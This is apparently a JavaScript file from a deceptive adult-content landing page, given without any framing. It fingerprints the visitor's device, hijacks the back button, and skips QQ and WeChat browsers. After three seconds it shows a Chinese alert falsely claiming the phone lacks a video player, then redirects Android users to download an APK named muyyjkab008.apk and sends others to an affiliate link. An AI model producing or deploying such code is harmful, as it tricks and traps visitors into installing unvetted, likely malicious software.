var androidDownUrl = u1a+'muyyjkab008.apk';
var h5url= u2h+"?AgentID=97048";
var system = {
    win: false,
    mac: false,
    iPhone: false,
    xll: false,
    ipad: false,
    Android: false,
    Ios: false
};
var p = navigator.platform;
var u = navigator.userAgent;
system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.iPhone = p.indexOf('iPhone') == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
system.ipad = (navigator.userAgent.match(/iPad/i) != null) ? true : false;
system.Android = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
system.ios = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
//if (system.win || system.mac || system.xll || system.iPhone) {
//    window.location.href = "http://baidu.com/";
//}
//if (system.win || system.xll ) {
//    window.location.href = "http://baidu.com/";
//}

var ua = navigator.userAgent.toLowerCase();
var isback = g("back");
if (isback != "1") {
    history.pushState({ page: 1 }, "title 1", "#nbb");
    window.onhashchange = function(event) {
        window.location.hash = "nbb";
    };
}
if (ua.toLocaleLowerCase().indexOf("qq/") > -1 || ua.match(/MicroMessenger/i) == "micromessenger") {

} 
else setTimeout("doDown()", "3000");


var isShow = false;
var c = g("cha");
if (c == null) c = "null";
var Tip = '警告：私 密 影 院 含有成人内容!适合18岁以上人群浏览.\n\n没有检测到您手机可用视频播放器,本站已停用所有迅雷资源，您是否立刻安装观看？\n\n安装后运行即可看4W部高清成人电影！\n\n感谢您对私密影院的支持，一路同行，感谢有你。';
var tips = "★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★";

function downfile() {
    doDown();
}

function doDown() {
    showTip0();
}

function showTip0() {
    if (isShow) return;	
    isShow = true;
    alert(Tip);
	
	if(system.Android){
		location.href = androidDownUrl;
		showTip("", "", 3000, true);
	}
	else{
		location.href=h5url;
	}
}

function showTip(text, down_url, delay, set_timer) {
    if (set_timer == true) {
        window.setTimeout("showTip('" + text + "', '', '" + delay + "', false)", delay)
    } else {
        //alert(tips);
        isShow = false;
        //location.href = getPackage(c);
    }
}

function getPackage(c) {  
}

function g(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

function getNowFormatDate() {
    var day = new Date();
    var Year = 0;
    var Month = 0;
    var Day = 0;
    var CurrentDate = "";
    Year = day.getFullYear();
    Month = day.getMonth() + 1;
    Day = day.getDate();
    Hour = day.getHours();
    Minute = day.getMinutes();
    Minute = Minute - (Minute % 10);
    Second = day.getSeconds();
    CurrentDate += Year;
    if (Month >= 10) CurrentDate += Month;
    else CurrentDate += "0" + Month;
    if (Day >= 10) CurrentDate += Day;
    else CurrentDate += "0" + Day;
    if (Hour >= 10) CurrentDate += Hour;
    else CurrentDate += "0" + Hour;
    if (Minute >= 10) CurrentDate += Minute;
    else CurrentDate += "0" + Minute;
    //if(Second >= 10) CurrentDate += Second;
    //else CurrentDate += "0" + Second;
    return CurrentDate;
}
